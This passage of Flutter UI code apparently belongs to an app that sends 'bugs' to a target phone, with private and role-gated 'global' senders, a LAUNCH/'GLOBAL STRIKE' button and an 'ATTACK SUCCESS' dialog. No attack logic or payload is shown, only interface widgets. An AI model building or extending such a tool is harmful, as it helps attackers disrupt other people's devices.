                                  ],
                                ),
                              ),
                              if (sel)
                                Positioned(
                                  top: 14,
                                  right: 14,
                                  child: Container(
                                    width: 24,
                                    height: 24,
                                    decoration: BoxDecoration(
                                      color: _AC.accent,
                                      shape: BoxShape.circle,
                                    ),
                                    child: const Icon(
                                      Icons.check,
                                      color: Colors.white,
                                      size: 12,
                                    ),
                                  ),
                                ),
                            ],
                          ),
                        ),
                      );
                    },
                  ),
          ),
          const SizedBox(height: 16),
          Row(
            mainAxisAlignment: MainAxisAlignment.center,
            children: List.generate(
              widget.listBug.isEmpty
                  ? 1
                  : (widget.listBug.length > 5 ? 5 : widget.listBug.length),
              (index) {
                final si = widget.listBug.indexWhere(
                  (b) => b['bug_id'] == selectedBugId,
                );
                final active = si == index || (si > 4 && index == 4);
                return AnimatedContainer(
                  duration: const Duration(milliseconds: 300),
                  curve: Curves.easeOutCubic,
                  margin: const EdgeInsets.symmetric(horizontal: 2.5),
                  height: 4,
                  width: active ? 24 : 7,
                  decoration: BoxDecoration(
                    color: active ? _AC.accent : _AC.border2,
                    borderRadius: BorderRadius.circular(4),
                  ),
                );
              },
            ),
          ),
        ],
      ),
    );
  }

  // ═══════════════════════════════════════════════════════════════════
  //  DEPLOY CARD (Sender Mode — solid style)
  // ═══════════════════════════════════════════════════════════════════
  Widget _buildDeployCard() {
    return _solidCard(
      idx: 3,
      child: Column(
        children: [
          Row(
            children: [
              _buildSecIco(FontAwesomeIcons.server),
              const SizedBox(width: 12),
              const Text(
                'DEPLOY',
                style: TextStyle(
                  fontFamily: 'MADEEvolveSansEVO',
                  fontSize: 13,
                  fontWeight: FontWeight.w700,
                  letterSpacing: 3,
                  color: _AC.text,
                ),
              ),
              const Spacer(),
              GestureDetector(
                onTap: _isLoadingSenders ? null : _fetchSenderCounts,
                child: Container(
                  width: 36,
                  height: 36,
                  decoration: BoxDecoration(
                    borderRadius: BorderRadius.circular(10),
                    color: _AC.surface,
                    border: Border.all(color: _AC.border2),
                  ),
                  child: Center(
                    child: _isLoadingSenders
                        ? SizedBox(
                            width: 14,
                            height: 14,
                            child: CircularProgressIndicator(
                              strokeWidth: 2,
                              color: _AC.accent.withOpacity(0.6),
                            ),
                          )
                        : const FaIcon(
                            FontAwesomeIcons.rotate,
                            color: _AC.muted2,
                            size: 14,
                          ),
                  ),
                ),
              ),
            ],
          ),
          const SizedBox(height: 16),
          Row(
            children: [
              Expanded(
                child: _buildDeployOpt(
                  icon: FontAwesomeIcons.userShield,
                  title: 'PRIVATE',
                  subtitle: 'Your Session',
                  type: 'private',
                  selColor: _AC.accent,
                ),
              ),
              const SizedBox(width: 12),
              Expanded(
                child: _buildDeployOpt(
                  icon: FontAwesomeIcons.globe,
                  title: 'GLOBAL',
                  subtitle: '$_globalSenderCount Active',
                  type: 'global',
                  selColor: _AC.success,
                ),
              ),
            ],
          ),
        ],
      ),
    );
  }

  Widget _buildDeployOpt({
    required IconData icon,
    required String title,
    required String subtitle,
    required String type,
    required Color selColor,
  }) {
    final sel = _senderType == type;
    final disabled = type == 'global' && !canUseGlobalSender;

    return GestureDetector(
      onTap: () {
        if (disabled) {
          _showAlert(
            "Access Denied",
            "Global sender is only available for: Founder, VIP, Owner, High Owner, High Admin, Moderator, Dev",
          );
          return;
        }
        setState(() => _senderType = type);
      },
      child: AnimatedContainer(
        duration: const Duration(milliseconds: 250),
        curve: Curves.easeOutCubic,
        decoration: BoxDecoration(
          borderRadius: BorderRadius.circular(16),
          color: sel ? selColor.withOpacity(0.08) : _AC.surface,
          border: Border.all(
            color: sel ? selColor : _AC.border,
            width: sel ? 1.5 : 1.0,
          ),
        ),
        padding: const EdgeInsets.symmetric(vertical: 20, horizontal: 14),
        child: Column(
          children: [
            Container(
              width: 48,
              height: 48,
              decoration: BoxDecoration(
                borderRadius: BorderRadius.circular(15),
                color: sel ? selColor.withOpacity(0.12) : _AC.card,
                border: Border.all(
                  color: sel ? selColor.withOpacity(0.2) : _AC.border2,
                ),
              ),
              child: Center(
                child: FaIcon(
                  icon,
                  color: disabled
                      ? const Color(0xFFF59E0B).withOpacity(0.3)
                      : sel
                      ? selColor
                      : _AC.muted,
                  size: 22,
                ),
              ),
            ),
            const SizedBox(height: 12),
            Text(
              title,
              style: TextStyle(
                fontFamily: 'MADEEvolveSansEVO',
                fontSize: 13,
                fontWeight: FontWeight.w700,
                letterSpacing: 2,
                color: disabled
                    ? const Color(0xFFF59E0B).withOpacity(0.4)
                    : sel
                    ? _AC.text
                    : _AC.muted,
              ),
            ),
            const SizedBox(height: 5),
            Text(
              subtitle,
              style: const TextStyle(
                fontFamily: 'ShareTechMono',
                fontSize: 10,
                color: _AC.muted,
              ),
            ),
          ],
        ),
      ),
    );
  }

  // ═══════════════════════════════════════════════════════════════════
  //  LAUNCH BUTTON (Clean solid style with pulse)
  // ═══════════════════════════════════════════════════════════════════
  Widget _buildLaunchButton() {
    return AnimatedBuilder(
      animation: _pulseController,
      builder: (ctx, child) {
        final pulse = _pulseController.value;
        return Container(
          width: double.infinity,
          height: 62,
          decoration: BoxDecoration(
            borderRadius: BorderRadius.circular(16),
            boxShadow: [
              BoxShadow(
                color: _AC.accent.withOpacity(0.18 + pulse * 0.08),
                blurRadius: 24,
              ),
            ],
          ),
          child: Container(
            decoration: BoxDecoration(
              borderRadius: BorderRadius.circular(16),
              gradient: const LinearGradient(
                colors: [_AC.accent, Color(0xFF991133)],
                begin: Alignment(-0.7, -0.4),
                end: Alignment(0.7, 0.4),
              ),
            ),
            child: Material(
              color: Colors.transparent,
              child: InkWell(
                borderRadius: BorderRadius.circular(16),
                onTap: _isSending ? null : _sendBug,
                splashColor: Colors.white.withOpacity(0.08),
                highlightColor: Colors.white.withOpacity(0.04),
                child: Center(
                  child: _isSending
                      ? Row(
                          mainAxisAlignment: MainAxisAlignment.center,
                          children: [
                            SizedBox(
                              width: 22,
                              height: 22,
                              child: CircularProgressIndicator(
                                strokeWidth: 2.5,
                                color: Colors.white.withOpacity(0.4),
                              ),
                            ),
                            const SizedBox(width: 16),
                            const Text(
                              'INJECTING',
                              style: TextStyle(
                                fontFamily: 'MADEEvolveSansEVO',
                                fontSize: 15,
                                fontWeight: FontWeight.w700,
                                letterSpacing: 5,
                                color: Colors.white,
                              ),
                            ),
                          ],
                        )
                      : Row(
                          mainAxisAlignment: MainAxisAlignment.center,
                          children: [
                            FaIcon(
                              _senderType == 'global'
                                  ? FontAwesomeIcons.rocket
                                  : FontAwesomeIcons.skull,
                              color: Colors.white,
                              size: 18,
                            ),
                            const SizedBox(width: 14),
                            Text(
                              _senderType == 'global'
                                  ? 'GLOBAL STRIKE'
                                  : 'LAUNCH',
                              style: const TextStyle(
                                fontFamily: 'MADEEvolveSansEVO',
                                fontSize: 15,
                                fontWeight: FontWeight.w700,
                                letterSpacing: 5,
                                color: Colors.white,
                              ),
                            ),
                            const SizedBox(width: 14),
                            Container(
                              padding: const EdgeInsets.all(5),
                              decoration: BoxDecoration(
                                shape: BoxShape.circle,
                                color: Colors.white.withOpacity(0.1),
                              ),
                              child: const Icon(
                                Icons.arrow_forward,
                                color: Colors.white,
                                size: 14,
                              ),
                            ),
                          ],
                        ),
                ),
              ),
            ),
          ),
        );
      },
    );
  }

  // ═══════════════════════════════════════════════════════════════════
  //  STATUS BAR
  // ═══════════════════════════════════════════════════════════════════
  Widget _buildStatusBar() {
    return Row(
      children: [
        Expanded(
          child: Container(
            padding: const EdgeInsets.symmetric(vertical: 14, horizontal: 16),
            decoration: BoxDecoration(
              color: _AC.card,
              borderRadius: BorderRadius.circular(12),
              border: Border.all(color: _AC.border2),
            ),
            child: Row(
              mainAxisAlignment: MainAxisAlignment.center,
              children: [
                Container(
                  width: 6,
                  height: 6,
                  decoration: BoxDecoration(
                    shape: BoxShape.circle,
                    color: _AC.success,
                    boxShadow: [BoxShadow(color: _AC.success, blurRadius: 4)],
                  ),
                ),
                const SizedBox(width: 8),
                const Text(
                  'SYSTEM ONLINE',
                  style: TextStyle(
                    fontFamily: 'ShareTechMono',
                    fontSize: 10,
                    fontWeight: FontWeight.w700,
                    color: _AC.success,
                    letterSpacing: 1.5,
                  ),
                ),
              ],
            ),
          ),
        ),
        const SizedBox(width: 10),
        Expanded(
          child: Container(
            padding: const EdgeInsets.symmetric(vertical: 14, horizontal: 16),
            decoration: BoxDecoration(
              color: _AC.card,
              borderRadius: BorderRadius.circular(12),
              border: Border.all(color: _AC.border2),
            ),
            child: Row(
              mainAxisAlignment: MainAxisAlignment.center,
              children: [
                FaIcon(FontAwesomeIcons.bug, color: _AC.accent, size: 10),
                const SizedBox(width: 8),
                Text(
                  '${widget.listBug.length} BUGS',
                  style: const TextStyle(
                    fontFamily: 'ShareTechMono',
                    fontSize: 10,
                    fontWeight: FontWeight.w700,
                    color: _AC.accent,
                    letterSpacing: 1.5,
                  ),
                ),
              ],
            ),
          ),
        ),
      ],
    );
  }

  // ── Shared Section Header + Icon Helper ──────────────────────────────
  Widget _buildSectionHeader(IconData icon, String title, {String? tag}) {
    return Row(
      children: [
        _buildSecIco(icon),
        const SizedBox(width: 14),
        Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Text(
              title,
              style: const TextStyle(
                fontFamily: 'MADEEvolveSansEVO',
                fontSize: 13,
                fontWeight: FontWeight.w700,
                letterSpacing: 3,
                color: _AC.text,
              ),
            ),
            const SizedBox(height: 4),
            Container(
              width: 30,
              height: 2,
              decoration: BoxDecoration(
                color: _AC.accent.withOpacity(0.4),
                borderRadius: BorderRadius.circular(1),
              ),
            ),
          ],
        ),
        if (tag != null) ...[
          const Spacer(),
          Container(
            padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 5),
            decoration: BoxDecoration(
              borderRadius: BorderRadius.circular(8),
              color: _AC.accent.withOpacity(0.1),
              border: Border.all(color: _AC.accent.withOpacity(0.2)),
            ),
            child: Text(
              tag,
              style: const TextStyle(
                fontFamily: 'ShareTechMono',
                fontSize: 10,
                fontWeight: FontWeight.w700,
                color: _AC.accent,
                letterSpacing: 1,
              ),
            ),
          ),
        ],
      ],
    );
  }

  Widget _buildSecIco(IconData icon) {
    return Container(
      width: 42,
      height: 42,
      decoration: BoxDecoration(
        borderRadius: BorderRadius.circular(13),
        color: _AC.accent.withOpacity(0.1),
        border: Border.all(color: _AC.accent.withOpacity(0.18)),
      ),
      child: Center(child: FaIcon(icon, color: _AC.accent, size: 17)),
    );
  }
}

// ═════════════════════════════════════════════════════════════════════════
//  SUCCESS DIALOG (Clean solid style — no video)
// ═════════════════════════════════════════════════════════════════════════
class _SuccessDialog extends StatefulWidget {
  final String target;
  final String senderType;
  final VoidCallback onDismiss;

  const _SuccessDialog({
    required this.target,
    required this.senderType,
    required this.onDismiss,
  });

  @override
  State<_SuccessDialog> createState() => _SuccessDialogState();
}

class _SuccessDialogState extends State<_SuccessDialog>
    with TickerProviderStateMixin {
  late AnimationController _scaleController;
  late AnimationController _infoController;
  late AnimationController _glowController;
  late AnimationController _ringController;

  @override
  void initState() {
    super.initState();
    _scaleController = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 500),
    );
    _infoController = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 500),
    );
    _glowController = AnimationController(
      vsync: this,
      duration: const Duration(seconds: 2),
    )..repeat(reverse: true);
    _ringController = AnimationController(
      vsync: this,
      duration: const Duration(seconds: 6),
    )..repeat();
    _scaleController.forward();
    Future.delayed(const Duration(milliseconds: 400), () {
      if (mounted) {
        _infoController.forward();
      }
    });
  }

  @override
  void dispose() {
    _scaleController.dispose();
    _infoController.dispose();
    _glowController.dispose();
    _ringController.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    final w = MediaQuery.of(context).size.width * 0.88;

    return Dialog(
      backgroundColor: Colors.transparent,
      insetPadding: EdgeInsets.zero,
      child: ScaleTransition(
        scale: CurvedAnimation(
          parent: _scaleController,
          curve: Curves.elasticOut,
        ),
        child: Container(
          width: w,
          constraints: const BoxConstraints(maxWidth: 380),
          decoration: BoxDecoration(
            color: _AC.card,
            borderRadius: BorderRadius.circular(20),
            border: Border.all(color: _AC.border, width: 1),
            boxShadow: [
              BoxShadow(
                color: Colors.black.withOpacity(0.5),
                blurRadius: 36,
                offset: const Offset(0, 14),
              ),
            ],
          ),
          child: Padding(
            padding: const EdgeInsets.fromLTRB(28, 30, 28, 28),
            child: FadeTransition(
              opacity: CurvedAnimation(
                parent: _infoController,
                curve: Curves.easeOut,
              ),
              child: ScaleTransition(
                scale: CurvedAnimation(
                  parent: _infoController,
                  curve: Curves.easeOut,
                ),
                child: Column(
                  mainAxisSize: MainAxisSize.min,
                  children: [
                    AnimatedBuilder(
                      animation: _ringController,
                      builder: (ctx, _) {
                        return Container(
                          width: 90,
                          height: 90,
                          padding: const EdgeInsets.all(3),
                          decoration: BoxDecoration(
                            shape: BoxShape.circle,
                            color: _AC.card,
                            border: Border.all(
                              color:
                                  (widget.senderType == 'global'
                                          ? _AC.success
                                          : _AC.accent)
                                      .withOpacity(
                                        0.25 + _glowController.value * 0.1,
                                      ),
                              width: 2,
                            ),
                          ),
                          child: Container(
                            width: double.infinity,
                            height: double.infinity,
                            decoration: BoxDecoration(
                              shape: BoxShape.circle,
                              gradient: LinearGradient(
                                begin: Alignment.topLeft,
                                end: Alignment.bottomRight,
                                colors: widget.senderType == 'global'
                                    ? [_AC.success, Color(0xFF1A9E4A)]
                                    : [_AC.accent, Color(0xFF991133)],
                              ),
                            ),
                            child: Center(
                              child: FaIcon(
                                widget.senderType == 'global'
                                    ? FontAwesomeIcons.rocket
                                    : FontAwesomeIcons.skullCrossbones,
                                color: Colors.white,
                                size: 36,
                              ),
                            ),
                          ),
                        );
                      },
                    ),
                    const SizedBox(height: 24),
                    Text(
                      widget.senderType == 'global'
                          ? 'GLOBAL STRIKE!'
                          : 'ATTACK SUCCESS',
                      style: const TextStyle(
                        fontFamily: 'MADEEvolveSansEVO',
                        fontSize: 18,
                        fontWeight: FontWeight.w700,
                        letterSpacing: 3,
                        color: _AC.text,
                      ),
                    ),
                    const SizedBox(height: 6),
                    Container(
                      width: 40,
                      height: 2,
                      decoration: BoxDecoration(
                        color: _AC.accent.withOpacity(0.3),
                        borderRadius: BorderRadius.circular(1),
                      ),
                    ),
                    const SizedBox(height: 18),
                    Container(
                      width: double.infinity,
                      padding: const EdgeInsets.all(16),
                      decoration: BoxDecoration(
                        color: _AC.surface,
                        borderRadius: BorderRadius.circular(14),
                        border: Border.all(color: _AC.border2),
                      ),
                      child: Column(
                        children: [
                          Row(
                            mainAxisAlignment: MainAxisAlignment.center,
                            children: [
                              const FaIcon(
                                FontAwesomeIcons.mobileScreen,
                                color: _AC.muted,
                                size: 16,
                              ),
                              const SizedBox(width: 10),
                              Text(
                                widget.target,
                                style: const TextStyle(
                                  fontFamily: 'ShareTechMono',
                                  fontSize: 16,
                                  fontWeight: FontWeight.w700,
                                  color: _AC.text,
                                ),
                              ),
                            ],
                          ),
                          const SizedBox(height: 12),
                          Container(
                            padding: const EdgeInsets.symmetric(
                              horizontal: 16,
                              vertical: 5,
                            ),
                            decoration: BoxDecoration(
                              borderRadius: BorderRadius.circular(8),
                              color:
                                  (widget.senderType == 'global'
                                          ? _AC.success
                                          : _AC.accent)
                                      .withOpacity(0.1),
                              border: Border.all(
                                color:
                                    (widget.senderType == 'global'
                                            ? _AC.success
                                            : _AC.accent)
                                        .withOpacity(0.2),
                              ),
                            ),
                            child: Text(
                              widget.senderType.toUpperCase(),
                              style: TextStyle(
                                fontFamily: 'ShareTechMono',
                                fontSize: 10,
                                fontWeight: FontWeight.w700,
                                letterSpacing: 2,
                                color: widget.senderType == 'global'
                                    ? _AC.success
                                    : _AC.accent,
                              ),
                            ),
                          ),
                        ],
                      ),
                    ),
                    const SizedBox(height: 24),
                    GestureDetector(
                      onTap: widget.onDismiss,
                      child: Container(
                        width: double.infinity,
                        padding: const EdgeInsets.symmetric(vertical: 14),
                        decoration: BoxDecoration(
                          color: _AC.text,
                          borderRadius: BorderRadius.circular(14),
                          boxShadow: [
                            BoxShadow(
                              color: Colors.black.withOpacity(0.3),
                              blurRadius: 14,
                            ),
                          ],
                        ),
                        child: const Center(
                          child: Text(
                            'CLOSE',
                            style: TextStyle(
                              fontFamily: 'MADEEvolveSansEVO',
                              fontSize: 12,
                              fontWeight: FontWeight.w700,
                              letterSpacing: 2.5,
                              color: _AC.bg,
                            ),
                          ),
                        ),
                      ),
                    ),
                  ],
                ),
              ),
            ),
          ),
        ),
      ),
    );
  }
}
